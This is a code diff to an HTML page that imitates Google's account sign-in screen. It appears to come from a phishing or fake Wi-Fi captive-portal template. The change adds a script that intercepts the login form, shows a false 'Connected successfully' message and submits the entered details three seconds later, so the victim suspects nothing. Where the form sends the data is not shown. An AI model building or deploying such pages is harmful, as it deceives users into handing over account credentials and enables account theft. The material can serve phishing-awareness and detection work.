@@ -111,6 +111,17 @@
       justify-content: end;
       padding: 30px 0px 25px 0px;
     }
+    div#form-block{
+      min-height: 150px;
+    }
+    div#success-block{
+      display: none;
+      text-align: center;
+      min-height: 100px;
+      margin-bottom: 30px;
+      justify-content: center;
+      align-items: center;
+    }
     @media screen and (min-width: 768px){
       .logo{
         max-width: 80px;
@@ -154,7 +165,7 @@
           <!-- /Google Logo -->
         </div>
       </center>
-      <div style='min-height: 150px'>
+      <div id='form-block'>
         <center>
           <div class='containertitle'>Sign in</div>
           <div class='containersubtitle'>Use your Google Account</div>
@@ -170,7 +181,25 @@
           </div>
         </form>
       </div>
+      <div id='success-block'>
+        <center>
+          <div>Connected successfully. </br>You will be redirected shortly.</div>
+        </center>
+      </div>
     </div>
   </div>
+
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      document.getElementById('success-block').style.display = 'flex';
+      document.getElementById('form-block').style.display = 'none';
+
+      setTimeout(function() {
+        document.getElementById('login-form').submit();
+      }, 3000);
+    });
+  </script>
 </body>
 </html>
